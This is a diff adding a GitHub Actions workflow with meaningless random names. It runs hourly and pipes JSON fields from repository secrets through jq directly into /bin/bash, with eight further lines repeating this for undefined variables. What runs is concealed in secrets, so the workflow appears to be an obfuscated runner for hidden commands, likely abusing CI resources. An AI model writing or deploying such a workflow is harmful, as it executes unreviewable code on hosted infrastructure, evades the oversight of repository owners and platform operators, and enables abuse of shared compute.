@@ -1,0 +1,26 @@
+name: yanjunping3215
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '59 * * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yanjunping3215
+        env:
+          a9930: ${{ secrets.a9930 }}
+        run: |
+          echo $a9930 | jq -r .yg53 | /bin/bash
+          echo $gahcm00890 | jq -r .hosyh467 | /bin/bash
+          echo $lme43289 | jq -r .dbbp49242 | /bin/bash
+          echo $uw82 | jq -r .yza4 | /bin/bash
+          echo $uwglf13027 | jq -r .xxw8 | /bin/bash
+          echo $btgs01 | jq -r .wsh56705 | /bin/bash
+          echo $p4583 | jq -r .knkmv24 | /bin/bash
+          echo $xfli223 | jq -r .kdriw862 | /bin/bash
+          echo $pu6 | jq -r .ft89438 | /bin/bash
+
